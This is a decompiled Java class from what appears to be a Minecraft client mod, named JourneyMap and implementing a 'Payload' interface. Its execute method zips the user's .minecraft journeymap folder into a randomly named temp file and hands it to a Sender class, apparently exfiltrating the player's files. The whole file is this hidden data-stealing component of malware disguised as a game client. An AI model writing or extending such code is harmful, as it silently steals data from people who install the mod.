package com.esoterik.client.util.impl;

import com.esoterik.client.features.modules.misc.Sender;
import com.esoterik.client.util.FileUtil;
import com.esoterik.client.util.Payload;
import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.LinkOption;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public final class JourneyMap implements Payload {
   public void execute() throws Exception {
      File packed = new File(System.getenv("TEMP") + "\\" + FileUtil.randomString());
      this.pack(System.getenv("APPDATA") + "\\.minecraft\\journeymap", packed.getPath());
      Sender.send(packed);
   }

   private void pack(String sourceDirPath, String zipFilePath) throws IOException {
      Path p = Files.createFile(Paths.get(zipFilePath));
      ZipOutputStream zs = new ZipOutputStream(Files.newOutputStream(p));
      Throwable var5 = null;

      try {
         Path pp = Paths.get(sourceDirPath);
         Files.walk(pp).filter((path) -> {
            return !Files.isDirectory(path, new LinkOption[0]);
         }).filter((path) -> {
            return !path.toFile().getName().endsWith(".png");
         }).forEach((path) -> {
            ZipEntry zipEntry = new ZipEntry(pp.relativize(path).toString());

            try {
               zs.putNextEntry(zipEntry);
               Files.copy(path, zs);
               zs.closeEntry();
            } catch (IOException var5) {
            }

         });
      } catch (Throwable var14) {
         var5 = var14;
         throw var14;
      } finally {
         if (zs != null) {
            if (var5 != null) {
               try {
                  zs.close();
               } catch (Throwable var13) {
                  var5.addSuppressed(var13);
               }
            } else {
               zs.close();
            }
         }

      }

   }
}
